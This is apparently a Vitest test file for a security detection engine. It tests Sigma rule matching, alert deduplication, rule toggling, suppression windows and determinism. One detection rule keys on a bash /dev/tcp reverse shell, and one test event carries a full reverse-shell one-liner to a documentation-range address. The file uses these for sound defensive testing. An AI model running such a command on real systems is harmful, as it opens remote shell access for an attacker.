import { alertSchema } from '@centinela/shared';
import { describe, expect, it } from 'vitest';
import { createEngine } from '../../src/detection/engine.js';
import { createDetector } from '../../src/detection/index.js';
import { createMemoryAlertSink } from '../../src/pipeline/memory-sink.js';
import { at, correlationRule, makeEvent, ruleSetFrom, sigmaRule } from './helpers.js';

const SUDO_ID = '7a8b9c0d-1111-4222-8333-444455556666';
const ruleSet = ruleSetFrom({
  'sigma/linux/builtin/lnx_reverse_shell.yml': sigmaRule({
    name: 'reverse-shell',
    author: 'Florian Roth (Nextron Systems)',
    level: 'high',
    tags: ['attack.execution', 'attack.t1059.004'],
    logsource: { product: 'linux' },
    detection: { keywords: ['bash -i >& /dev/tcp/'], condition: 'keywords' },
  }),
  'centinela/linux/sudo.yml': sigmaRule({
    id: SUDO_ID,
    name: 'sudo-refused',
    logsource: { product: 'linux', service: 'sudo' },
    detection: { s: { 'event.action': 'sudo_not_in_sudoers' }, condition: 's' },
  }),
  'centinela/windows/proc.yml': sigmaRule({
    name: 'proc',
    logsource: { product: 'windows', category: 'process_creation' },
    detection: { s: { 'Image|endswith': '\\whoami.exe' }, condition: 's' },
  }),
  'centinela/linux/building_block.yml': sigmaRule({
    name: 'bb',
    detection: { s: { 'event.action': 'ssh_login', 'event.outcome': 'failure' }, condition: 's' },
  }),
  'correlation/uses_bb.yml': correlationRule({
    name: 'uses-bb',
    correlation: {
      type: 'event_count',
      rules: ['bb'],
      'group-by': ['source.ip'],
      timespan: '5m',
      condition: { gte: 3 },
    },
  }),
});

const sudoEvent = (seconds: number, extra: { srcIp?: string; user?: string; host?: string } = {}) =>
  makeEvent({
    ts: at(seconds),
    logsources: [
      { product: 'linux', service: 'sudo' },
      { product: 'linux', service: 'auth' },
    ],
    fields: { 'event.action': 'sudo_not_in_sudoers' },
    ...extra,
  });

describe('single-event candidates', () => {
  it('carry the rule snapshot with the DRL attribution', () => {
    const engine = createEngine(ruleSet);
    const [candidate] = engine.process(
      makeEvent({
        ts: at(0),
        logsources: [{ product: 'linux', service: 'sudo' }],
        message: 'x; bash -i >& /dev/tcp/203.0.113.77/4444 0>&1',
      }),
    );
    expect(candidate?.rule).toMatchObject({
      title: 'Test rule reverse-shell',
      type: 'sigma',
      level: 'high',
      techniques: ['T1059.004'],
      tactics: ['execution'],
      author: 'Florian Roth (Nextron Systems)',
      license: 'DRL-1.1',
    });
    expect(candidate?.rule.url).toMatch(
      /^https:\/\/github\.com\/SigmaHQ\/sigma\/blob\/[0-9a-f]{40}\/rules\/linux\/builtin\/lnx_reverse_shell\.yml$/,
    );
  });

  it('use ruleId|host|source.ip as dedup key, then user.name, then Image, then empty', () => {
    const engine = createEngine(ruleSet);
    const keyOf = (event: ReturnType<typeof makeEvent>) => engine.process(event)[0]?.dedupKey;
    expect(keyOf(sudoEvent(0, { srcIp: '10.20.1.5', user: 'intern', host: 'db-01' }))).toBe(
      `${SUDO_ID}|db-01|10.20.1.5`,
    );
    expect(keyOf(sudoEvent(1, { user: 'intern', host: 'db-01' }))).toBe(`${SUDO_ID}|db-01|intern`);
    expect(keyOf(sudoEvent(2, { host: 'db-01' }))).toBe(`${SUDO_ID}|db-01|`);
    const proc = makeEvent({
      ts: at(3),
      host: 'WS-0142',
      logsources: [{ product: 'windows', category: 'process_creation' }],
      fields: { Image: 'C:\\Windows\\System32\\whoami.exe' },
    });
    expect(engine.process(proc)[0]?.dedupKey).toMatch(
      /\|WS-0142\|C:\\Windows\\System32\\whoami\.exe$/,
    );
  });

  it('list the event and its entities', () => {
    const event = sudoEvent(0, { srcIp: '10.20.1.5', user: 'intern', host: 'db-01' });
    const [candidate] = createEngine(ruleSet).process(event);
    expect(candidate).toMatchObject({
      groupKey: null,
      eventIds: [event.id],
      firstSeen: event.ts,
      lastSeen: event.ts,
      host: 'db-01',
      entities: { ips: ['10.20.1.5'], users: ['intern'], hosts: ['db-01'] },
    });
  });

  it('only come from rules whose logsource applies', () => {
    const sshd = makeEvent({ ts: at(0), fields: { 'event.action': 'sudo_not_in_sudoers' } });
    expect(createEngine(ruleSet).process(sshd)).toEqual([]);
  });

  it('are not emitted for building blocks, which still feed their correlation', () => {
    const engine = createEngine(ruleSet);
    const fail = (s: number) =>
      makeEvent({
        ts: at(s),
        srcIp: '203.0.113.45',
        fields: { 'event.action': 'ssh_login', 'event.outcome': 'failure' },
      });
    expect(engine.process(fail(0))).toEqual([]);
    expect(engine.process(fail(1))).toEqual([]);
    expect(engine.process(fail(2)).map((c) => c.rule.type)).toEqual(['correlation']);
  });

  it('ignore events whose timestamp cannot be read', () => {
    expect(createEngine(ruleSet).process({ ...sudoEvent(0), ts: 'not a time' })).toEqual([]);
  });
});

describe('enable and disable', () => {
  it('a disabled rule produces nothing until enabled again', () => {
    const engine = createEngine(ruleSet);
    expect(engine.setRuleEnabled(SUDO_ID, false)).toBe(true);
    expect(engine.process(sudoEvent(0))).toEqual([]);
    expect(engine.rules().find((r) => r.id === SUDO_ID)?.enabled).toBe(false);
    expect(engine.setRuleEnabled(SUDO_ID.toUpperCase(), true)).toBe(true);
    expect(engine.process(sudoEvent(1))).toHaveLength(1);
  });

  it('is per engine: other engines over the same rule set are not affected', () => {
    const a = createEngine(ruleSet);
    const b = createEngine(ruleSet);
    a.setRuleEnabled(SUDO_ID, false);
    expect(b.process(sudoEvent(0))).toHaveLength(1);
    expect(ruleSet.rule(SUDO_ID)?.meta.enabled).toBe(true);
  });

  it('returns false for an unknown id', () => {
    expect(
      createEngine(ruleSet).setRuleEnabled('00000000-0000-4000-8000-000000000000', false),
    ).toBe(false);
  });
});

describe('with the in-memory alert sink (ARCHITECTURE §7)', () => {
  it('folds repeated matches with the same dedup key into one alert', async () => {
    const engine = createEngine(ruleSet);
    const sink = createMemoryAlertSink();
    const events = Array.from({ length: 600 }, (_, i) =>
      sudoEvent(i, { user: 'intern', host: 'db-01' }),
    );
    await sink.upsert(events.flatMap((e) => engine.process(e)));
    const alerts = sink.list();
    expect(alerts).toHaveLength(1);
    expect(alerts[0]).toMatchObject({
      count: 600,
      firstSeen: events[0]?.ts,
      lastSeen: events[599]?.ts,
    });
    expect(sink.eventIds(alerts[0]?.id ?? '')).toHaveLength(100);
    alertSchema.parse(alerts[0]);
  });

  it('opens a new alert after the 15-minute suppression window', async () => {
    const engine = createEngine(ruleSet);
    const sink = createMemoryAlertSink();
    await sink.upsert([
      ...engine.process(sudoEvent(0, { user: 'intern' })),
      ...engine.process(sudoEvent(901, { user: 'intern' })),
    ]);
    expect(sink.list()).toHaveLength(2);
  });
});

describe('determinism', () => {
  it('the same events give the same candidates in the same order', () => {
    const events = Array.from({ length: 200 }, (_, i) =>
      i % 3 === 0
        ? sudoEvent(i, { user: `u${i % 7}` })
        : makeEvent({
            ts: at(i),
            srcIp: `203.0.113.${i % 4}`,
            fields: { 'event.action': 'ssh_login', 'event.outcome': 'failure' },
          }),
    );
    const engineA = createEngine(ruleSet);
    const engineB = createEngine(ruleSet);
    const a = events.flatMap((e) => engineA.process(e));
    const b = events.flatMap((e) => engineB.process(e));
    expect(a).toEqual(b);
    expect(new Set(a.map((c) => c.rule.type))).toEqual(new Set(['sigma', 'correlation']));
  });
});

describe('createDetector', () => {
  it('loads the rules lazily, on first use', () => {
    const detector = createDetector({ rulesDir: '/nonexistent/rules' });
    expect(() => detector.process(sudoEvent(0))).toThrow();
  });
});
